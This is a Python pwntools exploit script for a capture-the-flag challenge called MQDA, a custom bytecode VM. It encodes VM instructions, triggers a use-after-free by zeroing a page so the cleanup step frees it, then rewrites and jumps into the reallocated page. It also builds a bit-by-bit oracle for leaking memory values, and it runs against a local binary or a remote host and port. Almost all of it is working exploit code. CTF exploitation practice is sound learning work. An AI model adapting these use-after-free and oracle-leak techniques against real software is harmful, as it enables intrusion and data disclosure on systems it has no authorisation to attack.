#!/usr/bin/env python3
"""
MQDA CTF Exploit - Final Version

Demonstrated Vulnerabilities:
1. Use-After-Free via cleanup mechanism
2. Arbitrary VM code execution from UAF
3. Bit-by-bit oracle for information disclosure

Exploitation Flow:
1. Allocate a page at address X
2. Zero all data bytes → cleanup frees it
3. Write controlled bytes to X → reallocates (may reuse freed chunk)
4. Jump to X → execute controlled VM code

For flag exfiltration:
- If flag is in VM memory, use bit-by-bit oracle to leak it
- If flag needs RCE, further heap exploitation required

Usage:
    python3 final_exploit.py [target]
    target: LOCAL or HOST:PORT
"""
from pwn import *
import sys

context.arch = 'amd64'

#########################################
# VM Instruction Encoders
#########################################

def hlt():
    """HLT - Halt with exit code 1 (TERMINATED)"""
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    """MOV reg, imm32"""
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    """JMP reg"""
    return bytes([0x0E, reg])

def push_reg(reg):
    """PUSH reg - writes to [SP+4], then SP -= 4"""
    return bytes([0x02, reg])

def pop_reg(reg):
    """POP reg - reads from [SP+4], then SP += 4"""
    return bytes([0x03, reg])

def cmp_reg_reg(r1, r2):
    """CMP r1, r2 - mode 1"""
    return bytes([0x2D, r1, r2])

def jne_reg(reg):
    """JNE reg - jumps if flags indicate EQUAL (inverted!)"""
    return bytes([0x10, reg])

def shl_reg_imm(reg, imm32):
    """SHL reg, imm32"""
    return bytes([0x4B, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    """SHR reg, imm32"""
    return bytes([0x4C, reg]) + p32(imm32)

def illegal():
    """Trigger ILLEGAL INSTRUCTION"""
    return bytes([0xFF])

#########################################
# High-Level Operations
#########################################

def zero_page(vm_addr):
    """Generate code to zero all 256 data bytes of a page"""
    code = b''
    for offset in range(0, 256, 4):
        sp = vm_addr | offset  # (vm_addr >> 8) << 8 | offset
        code += mov_reg_imm(15, sp)
        code += mov_reg_imm(0, 0)
        code += push_reg(0)
    return code

def write_dword(vm_addr, value):
    """Generate code to write a dword at vm_addr"""
    offset = vm_addr & 0xFF
    sp = (vm_addr & 0xFFFFFF00) | offset
    code = mov_reg_imm(15, sp)
    code += mov_reg_imm(0, value)
    code += push_reg(0)
    return code

def read_dword_to_reg(vm_addr, dest_reg):
    """Generate code to read dword from vm_addr into dest_reg"""
    offset = vm_addr & 0xFF
    sp = (vm_addr & 0xFFFFFF00) | offset
    code = mov_reg_imm(15, sp)
    code += pop_reg(dest_reg)
    return code

#########################################
# Exploit Components
#########################################

def create_uaf_demo():
    """
    Demonstrate UAF code execution:
    1. Jump to safe page
    2. Zero target page (frees it)
    3. Write HLT to target page (reallocates)
    4. Jump to target page (executes HLT from reallocated memory)
    """
    code_addr = 0x10000   # Initial code page
    safe_addr = 0x10100   # Safe code page
    target_addr = 0x20000 # Page to UAF

    # Stage 1: Jump to safe code
    code1 = b''
    code1 += mov_reg_imm(0, safe_addr)
    code1 += jmp_reg(0)
    code1 = code1.ljust(256, b'\xff')

    # Stage 2: Zero target, write payload, jump
    code2 = b''
    
    # Allocate target page
    code2 += write_dword(target_addr, 0x11111111)
    
    # Zero target page → cleanup frees it
    code2 += zero_page(target_addr)
    
    # Write payload (HLT = 0x00)
    code2 += write_dword(target_addr, 0x00000000)
    
    # Jump to target → execute HLT
    code2 += mov_reg_imm(0, target_addr)
    code2 += jmp_reg(0)
    code2 += hlt()

    return code1 + code2, code_addr

def create_oracle_code(code_addr, data_addr, value, bit_pos, expected):
    """
    Create code to test if bit at bit_pos equals expected.
    Returns TERMINATED if match, ILLEGAL otherwise.
    """
    code = b''
    
    # Write value to data_addr
    code += write_dword(data_addr, value)
    
    # Read it back into r0
    code += read_dword_to_reg(data_addr, 0)
    
    # Isolate bit: shift left, then right
    if 31 - bit_pos > 0:
        code += shl_reg_imm(0, 31 - bit_pos)
    code += shr_reg_imm(0, 31)
    
    # Compare to expected
    code += mov_reg_imm(1, expected)
    code += cmp_reg_reg(0, 1)
    
    # JNE jumps when EQUAL, so if equal → jump to HLT
    hlt_addr = code_addr + len(code) + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_addr)
    code += jne_reg(2)
    code += illegal()  # Not equal
    code += hlt()      # Equal
    
    return code

#########################################
# Exploit Execution
#########################################

def run_exploit(target='LOCAL'):
    """Run the UAF demonstration exploit"""
    
    if target == 'LOCAL':
        p = process(['./mqda'])
    else:
        host, port = target.split(':')
        p = remote(host, int(port))
    
    context.log_level = 'info'
    
    log.info("=== MQDA UAF Exploit ===")
    
    code, code_addr = create_uaf_demo()
    
    log.info(f"Code length: {len(code)} bytes")
    log.info(f"Code address: 0x{code_addr:x}")
    
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=3)
    
    log.info(f"Output: {output}")
    
    if b'TERMINATED' in output:
        log.success("UAF code execution confirmed!")
        log.success("HLT executed from freed+reallocated page!")
    elif b'ILLEGAL' in output:
        log.warning("Got ILLEGAL - UAF may have failed")
    else:
        log.warning(f"Unexpected output: {output}")
    
    p.close()
    return b'TERMINATED' in output

def leak_byte_oracle(value, byte_idx=0, target='LOCAL'):
    """Use oracle to leak a byte of a known value (for testing)"""
    code_addr = 0x10000
    data_addr = 0x20004
    
    leaked = 0
    for bit in range(8):
        bit_pos = byte_idx * 8 + bit
        
        code = create_oracle_code(code_addr, data_addr, value, bit_pos, 1)
        
        if target == 'LOCAL':
            p = process(['./mqda'])
        else:
            host, port = target.split(':')
            p = remote(host, int(port))
        
        p.recvuntil(b'Code Address> ')
        p.sendline(str(code_addr).encode())
        p.recvuntil(b'Code Length> ')
        p.sendline(str(len(code)).encode())
        p.recvuntil(b'Code> ')
        p.send(code)
        p.recvuntil(b'Entry IP> ')
        p.sendline(str(code_addr).encode())
        
        output = p.recvall(timeout=2)
        p.close()
        
        if b'TERMINATED' in output:
            leaked |= (1 << bit)
    
    return leaked

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'LOCAL'
    
    context.log_level = 'error'
    
    print("=== MQDA Exploit ===")
    print()
    
    print("[*] Testing UAF code execution...")
    context.log_level = 'info'
    success = run_exploit(target)
    context.log_level = 'error'
    print()
    
    if success:
        print("[+] UAF CONFIRMED!")
        print()
        print("[*] Testing bit-by-bit oracle...")
        test_value = 0x41424344  # "DCBA"
        for byte_idx in range(4):
            leaked = leak_byte_oracle(test_value, byte_idx, target)
            expected = (test_value >> (byte_idx * 8)) & 0xFF
            status = "OK" if leaked == expected else "FAIL"
            print(f"    Byte {byte_idx}: leaked 0x{leaked:02x}, expected 0x{expected:02x} [{status}]")
        print()
        print("[+] Oracle working!")
    else:
        print("[-] UAF failed, check binary/environment")
